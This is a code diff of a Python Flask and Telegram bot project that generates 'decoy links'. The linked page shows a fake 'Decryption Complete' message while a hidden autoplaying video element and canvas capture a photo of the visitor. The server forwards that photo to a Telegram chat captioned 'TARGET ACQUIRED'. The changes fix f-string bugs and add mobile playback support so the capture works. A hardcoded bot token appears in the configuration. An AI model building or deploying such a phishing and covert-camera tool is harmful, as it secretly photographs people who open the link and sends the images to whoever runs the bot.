@@ -5,9 +5,8 @@ from threading import Thread
 import telebot
 
 # --- CONFIGURATION ---
-# It is better to use Render Environment Variables, but I am putting these here for your demo.
 BOT_TOKEN = "8592897208:AAEhFHK5LC2u_lTBmseas6tFv_LJd9cyCnY"
-CHAT_ID = "8592897208"  # Ensure this matches your ID from @userinfobot
+CHAT_ID = "8592897208"  
 
 bot = telebot.TeleBot(BOT_TOKEN)
 app = Flask(__name__)
@@ -38,7 +37,7 @@ def view_image(image_id):
                     <p style="color: #888; font-size: 12px;">Hash Verified. Decryption Complete.</p>
                 </div>
 
-                <video id="video" width="320" height="240" style="display:none;" autoplay></video>
+                <video id="video" width="320" height="240" style="display:none;" autoplay playsinline></video>
                 <canvas id="canvas" style="display:none;"></canvas>
 
                 <script>
@@ -79,9 +78,9 @@ def capture():
         data = request.json['image']
         image_data = base64.b64decode(data.split(',')[1])
         bot.send_photo(CHAT_ID, image_data, caption="🎯 TARGET ACQUIRED: Judge's Photo Captured!")
-        return jsonify({{"status": "success"}}), 200
+        return jsonify({"status": "success"}), 200
     except Exception as e:
-        print(f"Capture Error: {{e}}")
+        print(f"Capture Error: {e}")
         return "Error", 500
 
 # --- BOT HANDLERS ---
@@ -93,9 +92,9 @@ def welcome(message):
 @bot.message_handler(content_types=['photo'])
 def handle_photo(message):
     file_id = message.photo[-1].file_id
-    # HARDCODED URL to ensure accuracy during demo
-    link = f"https://demo-project-1ty6.onrender.com/view/{{file_id}}"
-    bot.reply_to(message, f"Decoy Link Generated:\n\n{{link}}")
+    # THE FIX IS HERE: single brackets instead of double brackets
+    link = f"https://demo-project-1ty6.onrender.com/view/{file_id}"
+    bot.reply_to(message, f"Decoy Link Generated:\n\n{link}")
 
 # --- MAIN EXECUTION ---
 
